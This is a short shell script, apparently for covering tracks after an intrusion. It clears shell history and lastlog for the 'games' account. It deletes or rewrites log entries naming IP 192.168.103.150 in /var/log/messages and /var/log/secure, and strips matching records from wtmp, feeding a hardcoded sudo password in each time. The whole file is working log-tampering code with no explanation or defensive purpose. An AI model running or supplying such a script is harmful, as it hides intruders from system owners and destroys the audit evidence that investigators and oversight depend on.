#!/bin/sh

history -c

echo Aa123456 | sudo -S lastlog -C -u games

echo Aa123456 | sudo -S sed -i '/192.168.103.150/'d /var/log/messages

echo Aa123456 | sudo -S sed -i 's/192.168.103.150/192.168.103.1/g' /var/log/secure

echo Aa123456 | sudo -S utmpdump /var/log/wtmp > /usr/games/.wtmp.file
echo Aa123456 | sudo -S sed -i "/games/d" .wtmp.file
echo Aa123456 | sudo -S sed -i "/103.150/d" .wtmp.file
echo Aa123456 | sudo -S utmpdump -r < /usr/games/.wtmp.file > /var/log/wtmp